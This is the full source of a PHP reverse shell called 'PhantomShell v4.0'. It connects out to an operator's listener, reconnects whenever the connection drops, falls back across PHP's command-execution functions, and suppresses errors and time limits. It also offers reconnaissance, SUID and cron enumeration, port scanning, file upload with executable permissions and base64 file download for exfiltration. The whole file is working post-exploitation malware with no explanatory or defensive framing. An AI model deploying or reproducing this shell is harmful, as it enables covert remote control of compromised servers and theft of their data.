<?php
set_time_limit(0);error_reporting(0);ignore_user_abort(true);
@ini_set('max_execution_time','0');@ini_set('memory_limit','-1');

$CFG=array('host'=>'0.0.0.0','port'=>4444,'reconnect'=>5,'timeout'=>30,
    'hist'=>array(),'hist_idx'=>0,'hist_file'=>'/tmp/.ph_nhist');

function sw($s,$d){$l=strlen($d);$w=0;while($w<$l){$n=@fwrite($s,substr($d,$w));if(!$n)return false;$w+=$n;}return true;}
function x($cmd,&$out='',$cwd=null){
    if(!$cwd)$cwd=getcwd();$out='';
    if(function_exists('proc_open')){$d=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));$p=@proc_open($cmd,$d,$pp,$cwd);if(is_resource($p)){fclose($pp[0]);$out=stream_get_contents($pp[1]).stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);return proc_close($p);}}
    if(function_exists('exec')){$l=array();$r=0;@exec("cd ".escapeshellarg($cwd)."&&$cmd 2>&1",$l,$r);$out=implode("\n",$l);return $r;}
    if(function_exists('shell_exec')){$out=(string)@shell_exec("cd ".escapeshellarg($cwd)."&&$cmd 2>&1");return 0;}
    if(function_exists('system')){ob_start();$r=0;@system("cd ".escapeshellarg($cwd)."&&$cmd 2>&1",$r);$out=ob_get_clean();return $r;}
    if(function_exists('passthru')){ob_start();$r=0;@passthru("cd ".escapeshellarg($cwd)."&&$cmd 2>&1",$r);$out=ob_get_clean();return $r;}
    if(function_exists('popen')){$p=@popen("cd ".escapeshellarg($cwd)."&&$cmd 2>&1",'r');if($p){$out=stream_get_contents($p);return pclose($p);}}
    $out='Execution blocked';return -1;
}
function g_user(){if(function_exists('posix_getpwuid')&&function_exists('posix_geteuid')){$i=posix_getpwuid(posix_geteuid());if(isset($i['name']))return $i['name'];}$o='';x('whoami',$o);return trim($o)?:' unknown';}
function g_host(){$h=gethostname();return $h?$h:'unknown';}
function prompt(){return '[\033[1;32m'.g_user().'@'.g_host().'\033[0m:\033[1;34m'.getcwd()."\033[0m]\$ ";}

function cmd_sysinfo($s){
    $chks=array('Hostname'=>'hostname','Kernel'=>'uname -a','OS'=>"cat /etc/os-release 2>/dev/null|head -3",
        'Users'=>'id','Memory'=>'free -h 2>/dev/null','Disk'=>'df -h 2>/dev/null|head -5',
        'Interfaces'=>'ip -4 a 2>/dev/null||ifconfig 2>/dev/null','Listening'=>'ss -tlnp 2>/dev/null||netstat -tlnp 2>/dev/null',
        'SUID'=>'find / -perm -4000 -type f 2>/dev/null|head -15');
    sw($s,"\n\033[1;36m[System Info]\033[0m\n");
    foreach($chks as $l=>$c){$o='';x($c,$o);if(trim($o)!=='')sw($s,"\033[1;33m[$l]\033[0m\n".trim($o)."\n\n");}
}
function cmd_upload($s,$fn){
    if(!$fn)$fn='upload_'.time();
    sw($s,"\033[1;33m[*]\033[0m Send base64, end with --EOF--\n");
    stream_set_blocking($s,true);stream_set_timeout($s,120);$b='';
    while(true){$l=fgets($s,8192);if($l===false||trim($l)==='--EOF--')break;$b.=$l;}
    stream_set_blocking($s,false);
    $d=@base64_decode(preg_replace('/\s+/','',$b),true);
    if($d===false){sw($s,"\033[1;31m[-]\033[0m Invalid base64\n");return;}
    if(@file_put_contents($fn,$d)!==false){@chmod($fn,0755);sw($s,"\033[1;32m[+]\033[0m $fn (".strlen($d)." bytes)\n");}
    else sw($s,"\033[1;31m[-]\033[0m Write failed\n");
}
function cmd_download($s,$f){
    if(!$f){sw($s,"\033[1;31m[-]\033[0m Usage: download <file>\n");return;}
    if(!is_readable($f)){sw($s,"\033[1;31m[-]\033[0m Cannot read: $f\n");return;}
    $d=@file_get_contents($f);if($d===false){sw($s,"\033[1;31m[-]\033[0m Failed\n");return;}
    sw($s,"\033[1;32m[+]\033[0m $f (".strlen($d)." bytes)\n--BEGIN-B64--\n".chunk_split(base64_encode($d),76)."\n--END-B64--\n");
}
function cmd_portscan($s,$a){
    $p=preg_split('/\s+/',trim($a));if(count($p)<2){sw($s,"Usage: portscan <host> <ports>\n");return;}
    $host=$p[0];$ports=array();
    foreach(explode(',',$p[1]) as $sp){if(strpos($sp,'-')!==false){$r=explode('-',$sp);for($i=(int)$r[0];$i<=(int)$r[1];$i++)$ports[]=$i;}else $ports[]=(int)$sp;}
    $open=array();foreach($ports as $pt){$fp=@fsockopen($host,$pt,$en,$es,1);if($fp){$open[]=$pt;@fclose($fp);}}
    sw($s,"Open: ".implode(', ',$open)."\n");
}
function cmd_check_suid($s){$o='';x('find / -perm -4000 -type f 2>/dev/null',$o);sw($s,$o."\n");}
function cmd_check_cron($s){$o='';x('crontab -l 2>/dev/null;cat /etc/crontab 2>/dev/null',$o);sw($s,$o."\n");}

function cmd_help($s){
    sw($s,"\n\033[1;36m[PhantomShell — Normal Mode]\033[0m\n".str_repeat("-",40)."\n");
    sw($s,"  help           Show this help\n  sysinfo        System info\n  upload <f>     Upload file\n  download <f>   Download file\n");
    sw($s,"  portscan <h> <p>  Port scan\n  check_suid     SUID binaries\n  check_cron     Cron jobs\n");
    sw($s,"  cat/head/tail  File viewing\n  ls/cd/pwd      Navigation\n  grep/find      Search\n");
    sw($s,"  exit           Disconnect\n\n");
}

// Load history
if(file_exists($CFG['hist_file'])){$CFG['hist']=array_filter(explode("\n",@file_get_contents($CFG['hist_file'])));}

while(true){
    $sock=@fsockopen($CFG['host'],$CFG['port'],$en,$es,$CFG['timeout']);
    if(!$sock){sleep($CFG['reconnect']);continue;}
    stream_set_blocking($sock,false);
    sw($sock,"\n\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n");
    sw($sock,"\033[1;35m  PhantomShell v4.0 — Normal Mode\033[0m\n");
    sw($sock,"\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n\n");
    sw($sock,prompt());$cl='';
    while(true){
        $rd=array($sock);$w=null;$e=null;$sel=@stream_select($rd,$w,$e,0,200000);
        if($sel===false)break;if($sel===0)continue;
        $raw=@fread($sock,4096);if($raw===false||$raw==='')break;
        for($i=0;$i<strlen($raw);$i++){
            $ch=$raw[$i];
            if($ch==="\x03"){$cl='';sw($sock,"^C\n".prompt());continue;}
            if($ch==="\x7f"||$ch==="\x08"){if(strlen($cl)>0){$cl=substr($cl,0,-1);sw($sock,"\x08 \x08");}continue;}
            if($ch==="\x1b"&&$i+2<strlen($raw)&&$raw[$i+1]==='['){
                if($raw[$i+2]==='A'&&$CFG['hist_idx']>0){$CFG['hist_idx']--;$cl=$CFG['hist'][$CFG['hist_idx']];sw($sock,"\r\033[K".prompt().$cl);}
                elseif($raw[$i+2]==='B'){if($CFG['hist_idx']<count($CFG['hist'])-1){$CFG['hist_idx']++;$cl=$CFG['hist'][$CFG['hist_idx']];}else{$CFG['hist_idx']=count($CFG['hist']);$cl='';}sw($sock,"\r\033[K".prompt().$cl);}
                $i+=2;continue;
            }
            if($ch==="\n"||$ch==="\r"){
                if($ch==="\r"&&$i+1<strlen($raw)&&$raw[$i+1]==="\n")$i++;
                sw($sock,"\n");$cmd=trim($cl);$cl='';
                if($cmd===''){sw($sock,prompt());continue;}
                $CFG['hist'][]=$cmd;$CFG['hist_idx']=count($CFG['hist']);@file_put_contents($CFG['hist_file'],implode("\n",$CFG['hist']));
                $parts=preg_split('/\s+/',$cmd,2);$cn=strtolower($parts[0]);$ca=isset($parts[1])?$parts[1]:'';
                if($cn==='exit'||$cn==='quit')break 2;
                elseif($cn==='help')cmd_help($sock);
                elseif($cn==='cd'){$d=$ca?$ca:(getenv('HOME')?:'/');@chdir($d);sw($sock,getcwd()."\n");}
                elseif($cn==='pwd')sw($sock,getcwd()."\n");
                elseif($cn==='clear')sw($sock,"\033[2J\033[H");
                elseif($cn==='sysinfo')cmd_sysinfo($sock);
                elseif($cn==='upload')cmd_upload($sock,$ca);
                elseif($cn==='download')cmd_download($sock,$ca);
                elseif($cn==='portscan')cmd_portscan($sock,$ca);
                elseif($cn==='check_suid')cmd_check_suid($sock);
                elseif($cn==='check_cron')cmd_check_cron($sock);
                elseif($cn==='cat'){$d=@file_get_contents($ca);sw($sock,$d!==false?$d:"Cannot read\n");}
                else{$o='';x($cmd,$o);if($o!=='')sw($sock,$o);if($o!==''&&substr($o,-1)!=="\n")sw($sock,"\n");}
                sw($sock,prompt());continue;
            }
            if(ord($ch)>=32){$cl.=$ch;sw($sock,$ch);}
        }
    }
    @fclose($sock);sleep($CFG['reconnect']);
}
?>
